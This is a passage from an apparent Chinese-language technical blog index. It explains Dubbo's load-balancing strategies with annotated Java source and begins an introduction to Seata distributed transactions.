Return a invoker based on the random value.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                offset -= getWeight(invokers.get(i), invocation);</span><br><span class="line">                <span class="keyword">if</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> invokers.get(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If all invokers have the same weight value or totalWeight=0, return evenly.</span></span><br><span class="line">        <span class="keyword">return</span> invokers.get(random.nextInt(length));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由@SPI注解可以看到，dubbo默认的负载均衡策略是随机调用法。</p><p><img src="../img/Dubbo/DubboLoadBalanced1.png" alt=""></p><h4 id="RoundRobinLoadBlance"><a href="#RoundRobinLoadBlance" class="headerlink" title="RoundRobinLoadBlance"></a>RoundRobinLoadBlance</h4><p>轮询调用，轮询调用的过程主要是维护了局部变量的一个LinkdesHashMap（有顺序的Map）去存储调用者和权重值的对应关系，然后遍历每个调用者,把调用者和当前大于0的权重值放进去，再累加权重值。还有一个全局变量的map，找到第一个服务调用者，首先是找到每个服务的key值和method，这里可以理解为标识第一个调用者的唯一key，然后再给它对应的值保证原子性的+1（AtomicPositiveInteger是原子的），再对这个值取模总权重，再每次对其权重值-1，知道它取模与总权重值等于0就选择该调用者，可以称之为<strong>“降权取模”</strong>（只是一种的计算层面,而不是真正降权）。总结：<strong>轮询调用并不是简单的一个接着一个依次调用，它是根据权重的值进行循环的。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RoundRobinLoadBalance</span> <span class="keyword">extends</span> <span class="title">AbstractLoadBalance</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAME = <span class="string">"roundrobin"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ConcurrentMap&lt;String, AtomicPositiveInteger&gt; sequences = <span class="keyword">new</span> ConcurrentHashMap&lt;String, AtomicPositiveInteger&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function">Invoker&lt;T&gt; <span class="title">doSelect</span><span class="params">(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation)</span> </span>&#123;</span><br><span class="line">        String key = invokers.get(<span class="number">0</span>).getUrl().getServiceKey() + <span class="string">"."</span> + invocation.getMethodName();</span><br><span class="line">        <span class="keyword">int</span> length = invokers.size(); <span class="comment">// Number of invokers</span></span><br><span class="line">        <span class="keyword">int</span> maxWeight = <span class="number">0</span>; <span class="comment">// The maximum weight</span></span><br><span class="line">        <span class="keyword">int</span> minWeight = Integer.MAX_VALUE; <span class="comment">// The minimum weight</span></span><br><span class="line">        <span class="keyword">final</span> LinkedHashMap&lt;Invoker&lt;T&gt;, IntegerWrapper&gt; invokerToWeightMap = <span class="keyword">new</span> LinkedHashMap&lt;Invoker&lt;T&gt;, IntegerWrapper&gt;();</span><br><span class="line">        <span class="keyword">int</span> weightSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> weight = getWeight(invokers.get(i), invocation);</span><br><span class="line">            maxWeight = Math.max(maxWeight, weight); <span class="comment">// Choose the maximum weight</span></span><br><span class="line">            minWeight = Math.min(minWeight, weight); <span class="comment">// Choose the minimum weight</span></span><br><span class="line">            <span class="keyword">if</span> (weight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                invokerToWeightMap.put(invokers.get(i), <span class="keyword">new</span> IntegerWrapper(weight));</span><br><span class="line">                weightSum += weight;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        AtomicPositiveInteger sequence = sequences.get(key);</span><br><span class="line">        <span class="keyword">if</span> (sequence == <span class="keyword">null</span>) &#123;</span><br><span class="line">            sequences.putIfAbsent(key, <span class="keyword">new</span> AtomicPositiveInteger());</span><br><span class="line">            sequence = sequences.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> currentSequence = sequence.getAndIncrement();</span><br><span class="line">        <span class="keyword">if</span> (maxWeight &gt; <span class="number">0</span> &amp;&amp; minWeight &lt; maxWeight) &#123;</span><br><span class="line">            <span class="keyword">int</span> mod = currentSequence % weightSum;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxWeight; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Map.Entry&lt;Invoker&lt;T&gt;, IntegerWrapper&gt; each : invokerToWeightMap.entrySet()) &#123;</span><br><span class="line">                    <span class="keyword">final</span> Invoker&lt;T&gt; k = each.getKey();</span><br><span class="line">                    <span class="keyword">final</span> IntegerWrapper v = each.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (mod == <span class="number">0</span> &amp;&amp; v.getValue() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> k;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (v.getValue() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        v.decrement();</span><br><span class="line">                        mod--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Round robin</span></span><br><span class="line">        <span class="keyword">return</span> invokers.get(currentSequence % length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="LeastActiveLoadBlance"><a href="#LeastActiveLoadBlance" class="headerlink" title="LeastActiveLoadBlance"></a>LeastActiveLoadBlance</h4><p>最少活跃数调用法：这个方法的主要作用根据服务的提供者的运行状态去选择服务器,主要的思路就是遍历每个调用者，然后获取每个服务器的运行状态，如果当前运行的运行状态小于最小的状态-1，把它保存在leastIndexs中的第一个位置，并且认定所有的调用者权重都相同，然后直接返回那个调用者(这里的逻辑是：找到最少活跃数(在代码层反应就是：active的值))。如果计算出的权重值和最少的权重值相同，那么把它保存在leastIndexs数组里面，累加权重值，如果当前的权重值不等于初始值firstWeight，那么就认定不是所有的调用者的权重不同。然后再遍历lestIndexs，取权重累加值的随机数生成权重偏移量，在累减它，到它小于0的时候返回那个调用者。如果这些都不符合，就从leastIndexs随机选一个index，返回那个调用者！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LeastActiveLoadBalance</span> <span class="keyword">extends</span> <span class="title">AbstractLoadBalance</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAME = <span class="string">"leastactive"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function">Invoker&lt;T&gt; <span class="title">doSelect</span><span class="params">(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = invokers.size(); <span class="comment">// Number of invokers</span></span><br><span class="line">        <span class="keyword">int</span> leastActive = -<span class="number">1</span>; <span class="comment">// The least active value of all invokers</span></span><br><span class="line">        <span class="keyword">int</span> leastCount = <span class="number">0</span>; <span class="comment">// The number of invokers having the same least active value (leastActive)</span></span><br><span class="line">        <span class="keyword">int</span>[] leastIndexs = <span class="keyword">new</span> <span class="keyword">int</span>[length]; <span class="comment">// The index of invokers having the same least active value (leastActive)</span></span><br><span class="line">        <span class="keyword">int</span> totalWeight = <span class="number">0</span>; <span class="comment">// The sum of weights</span></span><br><span class="line">        <span class="keyword">int</span> firstWeight = <span class="number">0</span>; <span class="comment">// Initial value, used for comparision</span></span><br><span class="line">        <span class="keyword">boolean</span> sameWeight = <span class="keyword">true</span>; <span class="comment">// Every invoker has the same weight value?</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            Invoker&lt;T&gt; invoker = invokers.get(i);</span><br><span class="line">            <span class="keyword">int</span> active = RpcStatus.getStatus(invoker.getUrl(), invocation.getMethodName()).getActive(); <span class="comment">// Active number</span></span><br><span class="line">            <span class="keyword">int</span> weight = invoker.getUrl().getMethodParameter(invocation.getMethodName(), Constants.WEIGHT_KEY, Constants.DEFAULT_WEIGHT); <span class="comment">// Weight</span></span><br><span class="line">            <span class="keyword">if</span> (leastActive == -<span class="number">1</span> || active &lt; leastActive) &#123; <span class="comment">// Restart, when find a invoker having smaller least active value.</span></span><br><span class="line">                leastActive = active; <span class="comment">// Record the current least active value</span></span><br><span class="line">                leastCount = <span class="number">1</span>; <span class="comment">// Reset leastCount, count again based on current leastCount</span></span><br><span class="line">                leastIndexs[<span class="number">0</span>] = i; <span class="comment">// Reset</span></span><br><span class="line">                totalWeight = weight; <span class="comment">// Reset</span></span><br><span class="line">                firstWeight = weight; <span class="comment">// Record the weight the first invoker</span></span><br><span class="line">                sameWeight = <span class="keyword">true</span>; <span class="comment">// Reset, every invoker has the same weight value?</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (active == leastActive) &#123; <span class="comment">// If current invoker's active value equals with leaseActive, then accumulating.</span></span><br><span class="line">                leastIndexs[leastCount++] = i; <span class="comment">// Record index number of this invoker</span></span><br><span class="line">                totalWeight += weight; <span class="comment">// Add this invoker's weight to totalWeight.</span></span><br><span class="line">                <span class="comment">// If every invoker has the same weight?</span></span><br><span class="line">                <span class="keyword">if</span> (sameWeight &amp;&amp; i &gt; <span class="number">0</span></span><br><span class="line">                        &amp;&amp; weight != firstWeight) &#123;</span><br><span class="line">                    sameWeight = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// assert(leastCount &gt; 0)</span></span><br><span class="line">        <span class="keyword">if</span> (leastCount == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// If we got exactly one invoker having the least active value, return this invoker directly.</span></span><br><span class="line">            <span class="keyword">return</span> invokers.get(leastIndexs[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!sameWeight &amp;&amp; totalWeight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// If (not every invoker has the same weight &amp; at least one invoker's weight&gt;0), select randomly based on totalWeight.</span></span><br><span class="line">            <span class="keyword">int</span> offsetWeight = random.nextInt(totalWeight);</span><br><span class="line">            <span class="comment">// Return a invoker based on the random value.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; leastCount; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> leastIndex = leastIndexs[i];</span><br><span class="line">                offsetWeight -= getWeight(invokers.get(leastIndex), invocation);</span><br><span class="line">                <span class="keyword">if</span> (offsetWeight &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> invokers.get(leastIndex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If all invokers have the same weight value or totalWeight=0, return evenly.</span></span><br><span class="line">        <span class="keyword">return</span> invokers.get(leastIndexs[random.nextInt(leastCount)]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ConsistentHashLoadBalance"><a href="#ConsistentHashLoadBalance" class="headerlink" title="ConsistentHashLoadBalance"></a>ConsistentHashLoadBalance</h4><p>一致性Hash算法，doSelect方法进行选择。一致性Hash负载均衡涉及到两个主要的配置参数为hash.arguments与hash.nodes：当进行调用时候根据调用方法的哪几个参数生成key，并根据key来通过一致性hash算法来选择调用节点。例如调用方法invoke(Strings1,Strings2);若hash.arguments为1(默认值)，则仅取invoke的参数1（s1）来生成hashCode。</p><p>hash.nodes：节点的副本数。。dubbo的一致性哈希通过ConsistentHashLoadBalance类来实现。ConsistentHashLoadBalance内部定义ConsistentHashSelector类，最终通过该类进行结点选择。ConsistentHashLoadBalance实现的doSelect方法来利用所创建的ConsistentHashSelector对象选择结点。doSelect的实现如下。当调用该方法时，如果选择器不存在则去创建。随后通过ConsistentHashSelector的select方法选择结点。ConsistentHashSelector在构造函数内部会创建replicaNumber个虚拟结点，并将这些虚拟结点存储于TreeMap。随后根据调用方法的参数来生成key，并在TreeMap中选择一个结点进行调用。上述代码中hash(byte[]digest,intnumber)方法用来生成hashCode。该函数将生成的结果转换为long类，这是因为生成的结果是一个32位数，若用int保存可能会产生负数。而一致性hash生成的逻辑环其hashCode的范围是在0-MAX_VALUE之间。因此为正整数，所以这里要强制转换为long类型，避免出现负数。进行节点选择的方法为select,最后通过sekectForKey方法来选择结点。在进行选择时候若HashCode直接与某个虚拟结点的key一样，则直接返回该结点，如果hashCode落在某个节点上。若不在，找到一个最小上个的key所对应的结点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsistentHashLoadBalance</span> <span class="keyword">extends</span> <span class="title">AbstractLoadBalance</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ConcurrentMap&lt;String, ConsistentHashSelector&lt;?&gt;&gt; selectors = <span class="keyword">new</span> ConcurrentHashMap&lt;String, ConsistentHashSelector&lt;?&gt;&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function">Invoker&lt;T&gt; <span class="title">doSelect</span><span class="params">(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation)</span> </span>&#123;</span><br><span class="line">        String key = invokers.get(<span class="number">0</span>).getUrl().getServiceKey() + <span class="string">"."</span> + invocation.getMethodName();</span><br><span class="line">        <span class="keyword">int</span> identityHashCode = System.identityHashCode(invokers);</span><br><span class="line">        ConsistentHashSelector&lt;T&gt; selector = (ConsistentHashSelector&lt;T&gt;) selectors.get(key);</span><br><span class="line">        <span class="comment">//若选择器不存在去创建</span></span><br><span class="line">        <span class="keyword">if</span> (selector == <span class="keyword">null</span> || selector.identityHashCode != identityHashCode) &#123;</span><br><span class="line">            selectors.put(key, <span class="keyword">new</span> ConsistentHashSelector&lt;T&gt;(invokers, invocation.getMethodName(), identityHashCode));</span><br><span class="line">            selector = (ConsistentHashSelector&lt;T&gt;) selectors.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> selector.select(invocation);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//私有内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ConsistentHashSelector</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> TreeMap&lt;Long, Invoker&lt;T&gt;&gt; virtualInvokers;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> replicaNumber;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> identityHashCode;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] argumentIndex;</span><br><span class="line"> </span><br><span class="line">        ConsistentHashSelector(List&lt;Invoker&lt;T&gt;&gt; invokers, String methodName, <span class="keyword">int</span> identityHashCode) &#123;</span><br><span class="line">            <span class="keyword">this</span>.virtualInvokers = <span class="keyword">new</span> TreeMap&lt;Long, Invoker&lt;T&gt;&gt;();</span><br><span class="line">            <span class="keyword">this</span>.identityHashCode = identityHashCode;</span><br><span class="line">            URL url = invokers.get(<span class="number">0</span>).getUrl();</span><br><span class="line">            <span class="keyword">this</span>.replicaNumber = url.getMethodParameter(methodName, <span class="string">"hash.nodes"</span>, <span class="number">160</span>);</span><br><span class="line">            String[] index = Constants.COMMA_SPLIT_PATTERN.split(url.getMethodParameter(methodName, <span class="string">"hash.arguments"</span>, <span class="string">"0"</span>));</span><br><span class="line">            argumentIndex = <span class="keyword">new</span> <span class="keyword">int</span>[index.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index.length; i++) &#123;</span><br><span class="line">                argumentIndex[i] = Integer.parseInt(index[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (Invoker&lt;T&gt; invoker : invokers) &#123;</span><br><span class="line">                String address = invoker.getUrl().getAddress();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; replicaNumber / <span class="number">4</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">byte</span>[] digest = md5(address + i);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">4</span>; h++) &#123;</span><br><span class="line">                        <span class="keyword">long</span> m = hash(digest, h);</span><br><span class="line">                        <span class="comment">//虚拟调用者</span></span><br><span class="line">                        virtualInvokers.put(m, invoker);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">//选择调用</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Invoker&lt;T&gt; <span class="title">select</span><span class="params">(Invocation invocation)</span> </span>&#123;</span><br><span class="line">            String key = toKey(invocation.getArguments());</span><br><span class="line">            <span class="keyword">byte</span>[] digest = md5(key);</span><br><span class="line">            <span class="keyword">return</span> selectForKey(hash(digest, <span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转化为服务的key值</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> String <span class="title">toKey</span><span class="params">(Object[] args)</span> </span>&#123;</span><br><span class="line">            StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i : argumentIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= <span class="number">0</span> &amp;&amp; i &lt; args.length) &#123;</span><br><span class="line">                    buf.append(args[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//  </span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> Invoker&lt;T&gt; <span class="title">selectForKey</span><span class="params">(<span class="keyword">long</span> hash)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//从TreeMap中去寻找</span></span><br><span class="line">            Map.Entry&lt;Long, Invoker&lt;T&gt;&gt; entry = virtualInvokers.tailMap(hash, <span class="keyword">true</span>).firstEntry();</span><br><span class="line">            <span class="keyword">if</span> (entry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                entry = virtualInvokers.firstEntry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> entry.getValue();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算Hash值</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">hash</span><span class="params">(<span class="keyword">byte</span>[] digest, <span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (((<span class="keyword">long</span>) (digest[<span class="number">3</span> + number * <span class="number">4</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">                    | ((<span class="keyword">long</span>) (digest[<span class="number">2</span> + number * <span class="number">4</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>)</span><br><span class="line">                    | ((<span class="keyword">long</span>) (digest[<span class="number">1</span> + number * <span class="number">4</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                    | (digest[number * <span class="number">4</span>] &amp; <span class="number">0xFF</span>))</span><br><span class="line">                    &amp; <span class="number">0xFFFFFFFFL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//md5加密</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">byte</span>[] md5(String value) &#123;</span><br><span class="line">            MessageDigest md5;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">            md5.reset();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                bytes = value.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">            md5.update(bytes);</span><br><span class="line">            <span class="keyword">return</span> md5.digest();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Dubbo </tag>
            
            <tag> LoadBalanced </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seata分布式事务</title>
      <link href="/2022/01/27/Seata%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"/>
      <url>/2022/01/27/Seata%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="Seata简介"><a href="#Seata简介" class="headerlink" title="Seata简介"></a>Seata简介</h2><p>Seata是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务。</p><p><a href="http://seata.io/zh-cn/" target="_blank" rel="noopener">官方网址</a></p><h2 id="分布式事务问题"><a href="#分布式事务问题" class="headerlink" title="分布式事务问题"></a>分布式事务问题</h2><p>分布式前</p><ul><li>单机单库没这个问题</li><li>从1:1 -&gt; 1:N -&gt; N:N</li></ul><p>单体应用被拆分成微服务应用，原来的三个模块被拆分成三个独立的应用,分别使用三个独立的数据源，业务操作需要调用三三 个服务来完成。此时<strong>每个服务内部的数据一致性由本地事务来保证， 但是全局的数据一致性问题没法保证</strong>。</p><p><img src="/img/Seata/Seata0.png" alt=""></p><p>一句话：<strong>一次业务操作需要跨多个数据源或需要跨多个系统进行远程调用，就会产生分布式事务问题</strong>。</p><h2 id="Seata分布式事务处理过程"><a href="#Seata分布式事务处理过程" class="headerlink" title="Seata分布式事务处理过程"></a>Seata分布式事务处理过程</h2><p>分布式事务处理过程的一ID+三组件模型：</p><ul><li>Transaction ID XID 全局唯一的事务ID</li><li>三组件概念<ul><li>TC (Transaction Coordinator) - 事务协调者：维护全局和分支事务的状态，驱动全局事务提交或回滚。</li><li>TM (Transaction Manager) - 事务管理器：定义全局事务的范围：开始全局事务、提交或回滚全局事务。</li><li>RM (Resource Manager) - 资源管理器：管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</li></ul></li></ul><p>处理过程：</p><ol><li>TM向TC申请开启一个全局事务，全局事务创建成功并生成一个全局唯一的XID；</li><li>XID在微服务调用链路的上下文中传播；</li><li>RM向TC注册分支事务，将其纳入XID对应全局事务的管辖；</li><li>TM向TC发起针对XID的全局提交或回滚决议；</li><li>TC调度XID下管辖的全部分支事务完成提交或回滚请求。</li></ol><p><img src="/img/Seata/Seata1.png" alt=""></p><h2 id="Seata-Server安装"><a href="#Seata-Server安装" class="headerlink" title="Seata-Server安装"></a>Seata-Server安装</h2><p>发布说明: <a href="https://github.com/seata/seata/releases" target="_blank" rel="noopener">https://github.com/seata/seata/releases</a></p><p>本地事务——-&gt;Spring  @Transactional </p><p>全局事务——-&gt;Seata  @GlobalTransactional</p><p><strong>SEATA 的分布式交易解决方案</strong></p><p><img src="/img/Seata/Seata2.png" alt=""></p><p>我们只需要使用一个 @GlobalTransactional 注解在业务方法上:</p><p>Seata-Server安装</p><p>官网地址 - <a href="http://seata.io/zh-cn/" 